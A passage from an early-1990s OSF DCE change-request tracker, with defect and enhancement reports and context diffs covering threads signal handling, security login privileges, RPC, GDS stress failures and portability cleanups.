       #ifdef _CMA_PROTO_
       	(
       	cma__t_queue	*qptr)
       #else	/* no prototypes */
     ***************
     *** 337,346 ****
     --- 380,432 ----
       #endif
       
       /*
        *  FUNCTIONAL DESCRIPTION:
        *
     +  *	cma__reinit_self_vp:  post fork re-Initialize of vp data
     +  *
     +  *  FORMAL PARAMETERS:
     +  *
     +  *	None
     +  *
     +  *  IMPLICIT INPUTS:
     +  *
     +  *	None
     +  *
     +  *  IMPLICIT OUTPUTS:
     +  *
     +  *	None
     +  *
     +  *  FUNCTION VALUE:
     +  *
     +  *	None
     +  *
     +  *  SIDE EFFECTS:
     +  *
     +  *	vp of caller is reinitialized
     +  */
     + 
     + extern void
     + cma__reinit_self_vp
     + #ifdef _CMA_PROTO_
     + 	(void)
     + #else	/* no prototypes */
     + 	()
     + #endif	/* prototype */
     +     {
     + 	cma__t_int_tcb	*cur_tcb = cma__get_self_tcb();
     + 	cma__t_vpid	myvp = cur_tcb->sched.processor->vp_id;
     + 
     + 	
     + 	cma___load_vp(cur_tcb, myvp);
     +     }
     + 
     + 
     + 
     + /*
     +  *  FUNCTIONAL DESCRIPTION:
     +  *
        *	cma__reinit_vp:  Do pre/post fork re-Initialize 
        *
        *  FORMAL PARAMETERS:
        *
        *	flag
     ***************
     *** 382,472 ****
       	case cma__c_reinit_postfork_unlock : {
       	    cma__spinunlock (&cma___g_vp_lock);
       	    break;
       	    }
       	case cma__c_reinit_postfork_clear : {
     - 	    thread_t		self;
       	    cma__t_queue	*qptr;
       	    cma__t_int_tcb	*cur_tcb = cma__get_self_tcb();
       	    cma__t_vpid		myvp = cur_tcb->sched.processor->vp_id;
       
       	    /*
       	     * Remove all active VP structures, except for the VP that's
       	     * currently running.
       	     */
     - 	    self = thread_self ();
       	    qptr = cma__queue_next (&cma___g_vp_queue);
       
       	    while (qptr != &cma___g_vp_queue) {
       		cma__t_vpid	vptr = (cma__t_vpid)qptr;
       		cma__t_queue	*qnext = cma__queue_next (qptr);
       
     - 
       		if (vptr != myvp) {
       		    cma___del_vpid (qptr);
     - 		    /*
     - 		     * FIX-ME
     - 		     *
     - 		     * Need to determine whether ports are copied to a forked
     - 		     * task... if so, we need to port_deallocate() here, and
     - 		     * we don't need to allocate a new port for the current
     - 		     * VP (else clause).
     - 		     */
       		    }
     - 		else {
     - 		    kern_return_t	status;
     - 		    port_t		synch_port;
     - 		    task_t		task;
     - 		    thread_t		self;
     - 
     - 
     - 		    task = task_self ();
     - 		    self = thread_self ();
     - 		    status = port_allocate (task, &synch_port);
     - 
     - 		    cma__trace ((
     - 			    cma__c_trc_init | cma__c_trc_vp,
     - 			    "(reinit_vp) running in thread %x, vpid %x, vp %d, synch is %d",
     - 			    cur_tcb,
     - 			    myvp,
     - 			    self,
     - 			    synch_port));
     - 
     - 		    if (status != KERN_SUCCESS) {
     - 			cma__trace ((
     - 				cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     - 				"(reinit_vp) error \"%s\" (%d) allocating def. VP synch port",
     - 				mach_error_string (status),
     - 				status));
     - 			cma__bugcheck ("reinit_vp: port_allocate");
     - 			}
     - 
     - 		    status = port_disable (task, synch_port);
     - 		    if ((status != KERN_SUCCESS) && (status != KERN_NOT_IN_SET)) {
     - 			cma__trace ((
     - 				cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     - 				"(reinit_vp) error \"%s\" (%d) disabling port %d",
     - 				mach_error_string (status),
     - 				status,
     - 				synch_port));
     - 			cma__bugcheck ("reinit_vp: port_disable");
     - 			}
     - 
     - 		    if ((status = port_set_backlog (task, synch_port, 1)) != KERN_SUCCESS) {
     - 			cma__trace ((
     - 				cma__c_trc_init | cma__c_trc_vp | cma__c_trc_bug,
     - 				"(reinit_vp) error \"%s\" (%d) setting port %d backlog",
     - 				mach_error_string (status),
     - 				status,
     - 				synch_port));
     - 			cma__bugcheck ("reinit_vp: port_set_backlog");
     - 			}
     - 
     - 		    vptr->vp = self;
     - 		    vptr->synch = synch_port;
     - 		    vptr->flags = cma__c_vp_running | cma__c_vp_default;
     - 		    }
       
       		qptr = qnext;
       		}
       
       	    /*
     --- 468,494 ----
     ***************
     *** 476,488 ****
       
       	    while (qptr != &cma___g_vp_cache) {
       		cma__t_vpid	vptr = (cma__t_vpid)qptr;
       		cma__t_queue	*qnext = cma__queue_next (qptr);
       
     - 
       		cma___del_vpid (qptr);
     - 
       		qptr = qnext;
       		}
       
       	    cma__spinunlock (&cma___g_vp_lock);
       	    break;
     --- 498,508 ----



CR Number                     : 9393
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : 
Short Description             : cma_sigwait does not work correctly for kernel threads
Reported Date                 : 11/8/93
Found in Baseline             : 1.0.3
Found Date                    : 11/8/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/8/93 public]

problem description:

 Hitachi uses the information in the prorting and testing guide (Threads
 Preprocessor Variables) to build cma threads for execution in kernel
 on a multiprocessor. Whether or not this is recommended, or supported is
 in doubt, but at least we should capture the problems they are having.
 They report:

 The cma_sigwait function does not work properly in a kernel threads
 environment.  The cma__sig_deliver function assumes that it is
 sufficient to set a flag that will be seen by the next CMA kernel
 entry or exit.  This is not true for kernel threads.

 Reason:  suppose we have main thread t0 and child thread t1.  t1 does
 a cma_sigwait() and t0 is also sleeping.  The desired signal occurs.
 Thread t0 wakes up, the signal handler sets the flag and goes back to
 sleep.  Nobody goes through the kernel!

Proposed Solution:

 when the signal handler runs, it must attempt to enter the
 kernel.  If it can, it does the wakeup directly and returns.  If it
 can't, set the flag and again try to enter the kernel.  (Setting the
 flag alone is not sufficient -- there's a timing window that way.)

 As an additional Fun Thing, the locking in this code is not
 sufficient; there are windows, which requires rearranging some of the
 locking to close the windows.  This revolves around the sigprocmask
 calls, which must be globally locked (only one signal mask per
 process, not one per thread).  I got rid of the usage of the
 tcb->tswait_mutex, which isn't used with kernel threads anyway, and
 use the global sigwait mutex instead.

     *** /cma_signal.c
     --- /new/cma_signal.c
     ***************
     *** 747,766 ****
           static sigaction_t       sig_oact[NSIG];
       #endif

           cma__int_init ();

     - #if (_CMA_OSIMPL_ == _CMA__OS_OSF)
     -     /* OSF/1 signal semantics do not allow other than the main thread to
     -      * do a sigwait, since only thread 0 will receive asynchronous signals,
     -      * and it's not meaningful to sigwait() for synchronous signals.
     -      */
     -
     -     if (cma__get_self_tcb () != &cma__g_def_tcb)
     -      return (cma__set_errno (EINVAL), -1);
     - #endif
     -
           /*
            * For each signal, check to see if it is set in the user's mask.  If it is
            * also set in the "illegal values" mask, or if it is not set in the current
            * mask, then return an error.  Also, if there are no signals set in the
            * user's mask, return an error.
     --- 747,756 ----
     ***************
     *** 796,809 ****
           wblk.cv  = wblk.tcb->tswait_cv;

           /*
            * FIX-ME:  On VMS this should probably block ASTs
            */
           if (sigprocmask (SIG_BLOCK, &cma___g_sig_block_mask, &sig_mask) == -1)
        cma__bugcheck ("sigwait:2");

     -     cma__int_lock (cma___g_sigwait_mutex);
           cma__queue_insert ((cma__t_queue *)&wblk.queue, &cma___g_sigwait_queue);

           /*
            * Install the appropriate DECthreads signal handler for each signal that
            * the thread is waiting for, provided that we don't currently have a

     --- 786,800 ----
           wblk.cv  = wblk.tcb->tswait_cv;

           /*
            * FIX-ME:  On VMS this should probably block ASTs
            */
     +     cma__int_lock (cma___g_sigwait_mutex);
     +
           if (sigprocmask (SIG_BLOCK, &cma___g_sig_block_mask, &sig_mask) == -1)
        cma__bugcheck ("sigwait:2");

           cma__queue_insert ((cma__t_queue *)&wblk.queue,&cma___g_sigwait_queue);

           /*
            * Install the appropriate DECthreads signal handler for each signal that
            * the thread is waiting for, provided that we don't currently have a

     ***************
     *** 840,851 ****
             * signal handlers, etc.
             */
            cma___g_sigwaiters[i]++;
            }

     -     cma__int_unlock (cma___g_sigwait_mutex);
     -
           /*
            * Reenable the previously enabled signals, and then reenable the signals
            * that this thread is waiting for.
            *
            * FIX-ME:  On VMS this should probably unblock ASTs
     --- 831,840 ----
     ***************
     *** 854,882 ****
        cma__bugcheck ("sigwait:5");

           if (sigprocmask (SIG_UNBLOCK, set, (sigset_t *)cma_c_null_ptr) == -1)
        cma__bugcheck ("sigwait:6");

     -     cma__int_lock (wblk.tcb->tswait_mutex);
     -
           TRY {
        if (wblk.signal == -1)
            while (wblk.signal == -1)
     !          cma__int_wait (wblk.tcb->tswait_cv,wblk.tcb->tswait_mutex);
        else
            cma__attempt_delivery (wblk.tcb);
        }
           FINALLY {
     -  cma__int_unlock (wblk.tcb->tswait_mutex);
     -
        /*
         * FIX-ME:  On VMS this should probably block ASTs
         */
        if (sigprocmask (SIG_BLOCK, &cma___g_sig_block_mask, &sig_mask) == -1)
            cma__bugcheck ("sigwait:7");

     -  cma__int_lock (cma___g_sigwait_mutex);
       #if (_CMA_PLATFORM_ == _CMA__SINIX_MX300I)
        /*
        * FIX-ME:
        *       The compilers (/usr/ccs/bin/cc, /usr/ces/bin/cc) both have
        *       problems with taking the address of wblk.queue because it
     --- 843,866 ----
        cma__bugcheck ("sigwait:5");

           if (sigprocmask (SIG_UNBLOCK, set, (sigset_t *)cma_c_null_ptr) == -1)
        cma__bugcheck ("sigwait:6");

           TRY {
        if (wblk.signal == -1)
            while (wblk.signal == -1)
     !          cma__int_wait (wblk.tcb->tswait_cv, cma___g_sigwait_mutex);
        else
            cma__attempt_delivery (wblk.tcb);
        }
           FINALLY {
        /*
         * FIX-ME:  On VMS this should probably block ASTs
         */
        if (sigprocmask (SIG_BLOCK, &cma___g_sig_block_mask, &sig_mask) == -1)
            cma__bugcheck ("sigwait:7");

       #if (_CMA_PLATFORM_ == _CMA__SINIX_MX300I)
        /*
        * FIX-ME:
        *       The compilers (/usr/ccs/bin/cc, /usr/ces/bin/cc) both have
        *       problems with taking the address of wblk.queue because it
     ***************
     *** 912,931 ****
                        cma__bugcheck ("sigwait:9");
                    }
       #endif
                }

     -  cma__int_unlock (cma___g_sigwait_mutex);
     -
        /*
         * FIX-ME:  On VMS this should probably unblock ASTs
         */
        if (sigprocmask (SIG_SETMASK, &sig_mask, (sigset_t *)cma_c_null_ptr)
                == -1)
            cma__bugcheck ("sigwait:11");

        }
           ENDTRY

           return wblk.signal;
           }
       ^L
     --- 896,916 ----
                        cma__bugcheck ("sigwait:9");
                    }
       #endif
                }

        /*
         * FIX-ME:  On VMS this should probably unblock ASTs
         */
        if (sigprocmask (SIG_SETMASK, &sig_mask, (sigset_t *)cma_c_null_ptr)
                == -1)
            cma__bugcheck ("sigwait:11");

     +  cma__int_unlock (cma___g_sigwait_mutex);
     +
        }
     +
           ENDTRY

           return wblk.signal;
           }
       ^L
     ***************
     *** 1683,1693 ****
     --- 1668,1695 ----
        wblk = (cma___t_sigwait_block *)cma__queue_next (&wblk->queue);
        }

           if (wblk != (cma___t_sigwait_block*)&cma___g_sigwait_queue) {
        wblk->signal = sig;
     + #if !_CMA_THREAD_IS_VP_
               cma__int_signal_int (wblk->cv);
     + #else
     +  /* if we can enter the kernel, do so and wake someone up.  If we
     +   * can't enter the kernel, we just record this guy's presence;
     +   * whoever is in the kernel should do the wakeup -- UNLESS they
     +   * get out while we're doing this, so we check again after we
     +   * do the int_signal_int.
     +   */
     +  if (cma__tryenter_kernel()) {
     +             cma__int_signal_int (wblk->cv);      /* already locked */
     +      if (cma__tryenter_kernel())
     +                 cma__exit_kernel();              /* close a window */
     +         } else {
     +             cma__sem_iwake_one (&(wblk->cv->semaphore));
     +             cma__exit_kernel();
     +         }
     + #endif
        return cma_c_true;
        }
           else
        if (resend) {
       #if _CMA_OS_ == _CMA__VMS



CR Number                     : 9386
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : all
Short Description             : some files with duplicate RCS headers..
Reported Date                 : 11/5/93
Found in Baseline             : 1.0.3
Found Date                    : 11/5/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/5/93 public]

Most of the following files have two or more HISTORY/$Log:	c009386,v $
# Revision 1.5  96/08/26  17:50:23  root
# changed fields: Fix By Baseline   new/changed/deleted note(s) [damon 08/26/96 public]
# 
# Revision 1.4  94/03/15  15:06:59  nata
# added the Created HISTORY line
# 
# Revision 1.3  94/01/13  13:16:06  notuser
# changed fields: Responsible Engr.  Resp. Engr's Company   new/changed/deleted note(s) [marcyw 1/13/94 public]
# 
# Revision 1.2  93/11/05  16:37:22  notuser
# changed fields:  new/changed/deleted note(s) [sommerfeld 11/5/93 public]
# 
# Revision 1.1  93/11/05  16:28:34  notuser
# new CR
# /$EndLog$ in them
(some of them just have multiple $Log:	c009386,v $
# Revision 1.5  96/08/26  17:50:23  root
# changed fields: Fix By Baseline   new/changed/deleted note(s) [damon 08/26/96 public]
# 
# Revision 1.4  94/03/15  15:06:59  nata
# added the Created HISTORY line
# 
# Revision 1.3  94/01/13  13:16:06  notuser
# changed fields: Responsible Engr.  Resp. Engr's Company   new/changed/deleted note(s) [marcyw 1/13/94 public]
# 
# Revision 1.2  93/11/05  16:37:22  notuser
# changed fields:  new/changed/deleted note(s) [sommerfeld 11/5/93 public]
# 
# Revision 1.1  93/11/05  16:28:34  notuser
# new CR
# ').

directory/cds/cache/PMAX/casysinfo.c
directory/cds/cdsbrowser/panep.h
directory/cds/control/Makefile
directory/cds/library/PMAX/unix_getaddr.c
directory/cds/library/PMAX/unix_qarith.c
diskless/swap/user/cmd.c
lbe/bin/make/Makefile
lbe/bin/make/porting/environment.c
nosupport/test/systest/1.0.2systest/directory/cds/cds.acl.6/Makefile
rpc/runtime/PMAX/sysconf.h
test/security/api/control/id_map.tsh
test/security/api/moretests/idmap.c
test/security/api/moretests/idmap.h
test/security/api/moretests/key_mgmt.c
test/security/api/moretests/key_mgmt.h
test/security/api/moretests/main.c
test/security/api/moretests/rgy_misc.c
test/security/api/moretests/tsh_common.h
test/security/api/moretests/tsh_main.h
threads/AT386/cma_vmprot.c
threads/PMAX/cma_vmprot.c
time/libutc/kernel/PMAX/machdep.mk
time/libutc/kernel/SVR4/utc_adjtime.c
time/libutc/kernel/SVR4/utc_gettime.c

don't ask me why I noticed this :-).

assigned to "bld" since this seems like something the RAT's can clean up.

[11/5/93 public]

Aha! we have proof that OT uses RCS under the covers :-)

The $ L o g $ in my original entry was expanded in the text above..

[1/13/94 public]

Assigned to Ron Rizzo.

[08/26/96 public]

Unless this really needs to be addressed for 1.2.2, I'd like to defer this.
Since I there is no fixby entry that I can enter for a real defer, I am
simply removing the fixby entry.



CR Number                     : 9375
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : sec_login
Short Description             : certify shouldn't require root
Reported Date                 : 11/4/93
Found in Baseline             : 1.0.3
Found Date                    : 11/4/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/4/93 public]
sec_login_* API's that require privelidge (uid==0) should be changed to not
require priviledge.  It was a historical implmenation accident that never
got fixed.  Ask walt or Joe P for details. 

This will also involve a doc change when the code is changed

[11/8/93 public]
It was not an accident.  It was a design decision made at that time.  If it's
going to be changed, that will be new functionality, and will be done as an
enhancement.  Changed from 'def' to 'enh'.

[1/21/94 public]
The debate has been settled (sort of) on dce-tech.  valid_and_cert
*MUST* be a privileged operation.  Cancelling this enhancement request.

[1/25/94 public]
Howard channeling for walt:

Howard, I don't think this is quite correct.  I believe we have to:

	- Make sure it valid_and_cert() is spec'd to be the *only* API
	  that is privileged.  E.g.: sec_login_certify_identity()
	  manpage says, "On some systems, this may be a privileged
	  operation."

	- Make it clear that validated-but-not-certified login contexts
	  result only in warnings, not failures.  E.g.:
	  sec_login_get_expiration() manpage says, "This routine works
	  only on previously certified contexts."  [Curiously, the 1.0
	  doc says "validated" instead of "certified", which now
	  appears to be correct.]

The docs (and perhaps some code?) are currently deficient in these areas.

It would also be nice to fix the App Dev Gd to explain the "why" of
these things, but that's a major job.  At least the AES will (try to)
have the right info, and we've alerted Doc that it would be nice to do a
rehaul of the Sec documentation based on it.  But I don't know if that's
committed for 1.1.

The code portion is that we need to check some sec_* routines that require
certification (e.g. sec_login_inquire_net_info) and see if that is a
reasonable thing.  After this is done this should become a doc bug to
handle the above mentioned issues.

[1/25/94 public]
Thanks for including all the information on this topic, but adding comments
to a cancelled CR is not going to make sure that they're addressed, because
CR's in that state no longer show up on anybody's list...

Please open a doc CR for those docs that you feel are lacking in the description
of this problem.  As far as code goes, it's doing what it's spec'd to do and
will stay that way (per agreement from Walt, myself, Bill and Joe).  The
sec_login_inquire_net_info() call does not require certification, it gives you
a warning (doc calls it an error now, which is a bug that Joe sent email about
and should be in your description of the problem in the doc bug opened for the
above comments by Walt) if it's not certified.

[1/25/94 public]
Changed to open.  This is currently a code but and I'll leave it like that
so walt can comment on anything in code that needs to be reviewed.  When
done, change this to a doc bug.  Our code does a sec_login_certify_identity
and then a sec_login_inquire_net_info and works today.  That's what I care
about.  Walt...



CR Number                     : 9370
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : sec_admin
Short Description             : no way to know hostname of master
Reported Date                 : 11/4/93
Found in Baseline             : 1.0.3
Found Date                    : 11/4/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/4/93 public]
The names of security replicas is (by convention? default?),

    subsys/dce/sec/<hostname> 

but the name of the master is always (again by convention?)

    subsys/dce/sec/master

There is no easy way to know what host the security master is.  You can do
an info -full which gives teh string binding to the master, and then parse
that and using some probably external to DCE means (gethostbyaddr) convert
it to a name, but that's not a good story.

What if subsys/dce/sec/master was a link to a hostname?

[2/17/94 public]

Note that the master name need not necessarily be subsys/dce/sec/master
because change_master and become -slave/become -master (when available) 
can be used to change the master.

So the only definitive way to know the current master is via sec_admin
commands such as lrep or info. But even such info will not yield a host
name. So for now there is no way to obtain the hostname of a master other
than  by an external means (as you have pointed).



CR Number                     : 9364
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec.msg
Short Description             : confusing error message (Cell UUID not a valid cellname)
Reported Date                 : 11/4/93
Found in Baseline             : 1.0.3
Found Date                    : 11/4/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/4/93 public]

"Cell UUID is not a valid cell name"

(of course it's not; cell UUID's are not cell names..)

(seen in OT 9362).

Try rewording to "Cell UUID is not valid" or "Cell UUID not known to this
cell's security server" depending on what it really means..

P.S. "The door is a jar".



CR Number                     : 9363
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : DG runtime does not do
transfer syntax negotiation
Reported Date                 : 11/4/93
Found in Baseline             : 1.0.3
Found Date                    : 11/4/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[11/4/93 public]
The ncadg_ip_udp RPC protocol appearently ignores the setting
of the transfer syntax id in the ifspec.  When the RPC runtime
invokes the server stub routine the NDR syntax id is always
specified regardless of what is specified as supported in the
client and/or server ifspec.



CR Number                     : 9358
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : gdsstub gdscstub
Short Description             : stubs die under stress
Reported Date                 : 11/4/93
Found in Baseline             : 1.0.3
Found Date                    : 11/4/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : gds/stub/d25revent.c
					     gds/stub/d25uaction.c
					     gds/h/d27util.h
					     gds/ros/step/d27loga.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/4/93 public]
During a run of the gds_xds_str_001 system test, all of the C-stub 
processes on the non-initial DSA's are observerd to die, and the S-stub
on the initial dsa dies.  Further, on the 486 client, an attempt to bind
to the default (remote) DSA results in the C-stub exiting.

The configuration was as follows:

 Machine     Platform   DSA-Name  Dir-Id  GDS-Type  Default-DSA  Initial-DSA  
----------   --------   --------  ------  --------  -----------  -----------
 dce2        HP-UX       dsa-m1     1     cli-srv    dsa-m1      dsa-m1        
                                    2     client     dsa-m2            

 ironman     486/OSF1    dsa-m2     1     cli-srv    dsa-m1      dsa-m1        
                                    2     cli-srv    dsa-m2

 darkman     HP-UX       darkman    1     cli-srv    dsa-m1      dsa-m1
                                    2     client     dsa-m2            

 soldier     HP-UX       soldier    1     cli-srv    dsa-m1      dsa-m1
                                    2     client     dsa-m2            
                    

 dce2 and ironman were running two xt_test clients each, and 
 darkman and soldier were running 1 xt_test client each. 

 Each xt_test client was spawning 10 threads to perform various
 combinations of binds/reads/searches/unbinds.

 Jochen has trace logs and is looking into the problem.

[11/08/93 public]
The current state of this defect is as follows:
 
  The gds_xds_str_001 test causes the S-Stub and C-Stubs to exit after a 
  short (< 4 hour) period of time.  This behavior is observed if the test
  is run in the following scenarios:

       3 machines, 2 clients/machine, 10 threads per client = 60 threads
       4 machines, 6 total clients, 10 threads per client =   60 threads
       4 machines, 1 client/machine, 10 threads/client    =   40 threads
       4 machines, 1 client/machine, 8 threads/client     =   32 threads

  The problem (according to Jochen Keutel) seems to be related to
  contention for IPC resources.  In line with this reasoning, I ran the 
  test with 60, 40 and 32 threads after configuring the directory system 
  on each machined involved in the test for 256 client processes with no
  improvement in the test results.

  The question has arisen as to the fairness of the test; ie: can GDS be
  reasonably expected to handle this leve of stress?  Does this bear any
  resemblence to the stress/load we expect for GDS in actual usage?  

  The answer to the second question is almost impossible to answer with 
  any level of certainty.  The application of GDS ranges from the 
  lookup system for a mail system (very stressful), to a respository of 
  global names that is only referred if local name searches fail (barely
  stressful).  There are few if any case studies of GDS installations that
  might contribute data to an answer for this question.

  With regard to the first question, Dave Lounsebury has made the command 
  decision that the implemetation MUST pass at the following levels:
     1. MUST pass with a total of 16 threads
     2. SHOULD pass with as many as 32 threads.

  I will be re-running to get results for the 16 thread run today.

[11/10/93 public]
Stubs don't die any more, if resources are low.

[11/10/93 public]
Lowered priority and rolled over to 1.1 so we can continue to track this.

[7/11/94 public]
Increased priority.  This should be resolved in 1.1

[8/18/94 public]
We believe this has been fixed by other submissions -- it certainly has in
the FVTs.  Dropping priority to 2 until the fix is verified by the system
test suite.

[10/12/94 public]
Just as a closing note from DCE1.1:  the system tests were never run during
the final parts of the DCE1.1 endgame cycle so we don't know whether this
defect occurs or not.  I encourage the next GDS component owner to look
into this.



CR Number                     : 9347
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cds/control/paser_aid_2.c
Short Description             : parser_aid aborts on missing
input file
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.3
Found Date                    : 11/3/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/3/93 public]

 The code in the routine pass_1_file does not check whether its
 attempt to open an input file was successful.  If the attempt fails,
 the resulting bogus FILE pointer is passed to fgets, which bombs out
 on a SEGV.
 
The suggested fix is to check the return from fopen2().



CR Number                     : 9343
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : use of sys_nerr is not portable
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.2a
Found Date                    : 11/3/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : krb5/comerr/error_message.c krb5/comerr/internal.h krb5/lib/perror.c
Sensitivity                   : public

[11/3/93 public]

sys_nerr is a global variable which is used on some UNIX systems to
determine the maximum errno value. It is not supported by POSIX or XOPEN
(in fact XOPEN withdrew its support for it). For portability, the use of
sys_nerr should be removed.

One use of sys_nerr is in error_message() in krb5/comerr/error_message.c.
A possible solution is to first do a dce_error_inq_text() and check the
status on that call to determine if the error is a dce error:

        dce_error_inq_text(...,&inqstatus);
        if (inqstatus == 0) /* it's a DCE error */
        {
                ...
        }
        else /* it's (probably) a system error */
        {
                ...
        }

That way, the else clause is the system error and the test (offset <
sys_nerr) is removed.  Also the statement sys_errlist[offset] (not ANSI C)
should be replaced by strerror(offset) (ANSI C). If one could assume XPG/3
support for strerror() then a better solution whould be to check errno upon
return from strerror() for EINVAL to determine whether the error number is
a system error.

The other use of sys_nerr occurs in krb5/lib/perror.c, essentially another
implementation of strerror(). Shouldn't this code be defuncted and
<string.h> strerror() be used instead?

[11/3/93 public]

This code predates general availability of ANSI C libraries.

It should use strerror instead if and only if the status is less than a
constant (defaulting to 0x10000000)..

this is a code cleanup issue; deferred to 1.1



CR Number                     : 9341
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : Namespace pollution caused by wrapper definition
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.2a
Found Date                    : 11/3/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : cmalib_crtlx.h
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[11/3/93 public]
The wrapper for free is defined as follows:
#define free cma_lib_free
This prevents me from defining a structure member named "free".
This is a surprising and unreasonable restriction.  It could be avoided
by using:
#define free(p) cma_lib_free(p)
Likewise for various other wrappers in the same file.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[11/3/93 public]
Changed H/W Ref Platform from `hppa' to `all' 
Changed S/W Ref Platform from `hpux' to `all' 
Changed Component Name from `dfs' to `thr'



CR Number                     : 9338
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : sec auth_helper
Short Description             : dfsbind cache discards far too often
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.2
Found Date                    : 11/3/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/helper/auth_helper.c
Sensitivity                   : public

[11/3/93 public]
 The auth_helper cache is keyed by (pag, euid). Typical use of this
cache presents the cache with requests for several servers (the dfs
servers on the various servers in the cell) all from the same (pag,
euid) pair in bursts.
 Cache entries are 'discarded' -- their krb creds are removed and
replaced -- over and over in these bursts. The cache cosistently
discovers a slot used by a given (pag, euid) but which is caching the
ticket for the wrong (previously accessed) hosts/<varies>/dfs-server
principal. If I read it correctly, this results in disk traffic as the
old server's cred is dropped and the new one retrieved. Also the
registry (or self's name cache .nc file) is called/consulted to perform
a global name parse.. expensive.
 Why not convert the cache management to not tromp on a slot's krb? It
would seem more effective to to allow any number of slots to match a
given (pag, euid) pair just as long as each such slot holds the cred for
a different server.

[11/3/93 public]

this is, more or less, a reasonable suggestion..

[8/29/94 public]
Will do if there's time and if the OSF lets it in (if they don't, we'll at
least drop it in the unintegrated tree).



CR Number                     : 9336
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime/cn
Short Description             : Pipe's receiver thread coredumps with the memory allocation failure.
Reported Date                 : 11/3/93
Found in Baseline             : 1.0.3
Found Date                    : 11/3/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/3/93 public]
 
When using OUT-pipe on the slower client machine, the client coredumps with
the memory allocation failure in the receiver thread. This is caused by the
non-existence of the synchronization between the receiver thread and the
dequeueing thread, i.e., the client call thread doing push(). The simple
example is push() function doing write() to the slow IO device (at least
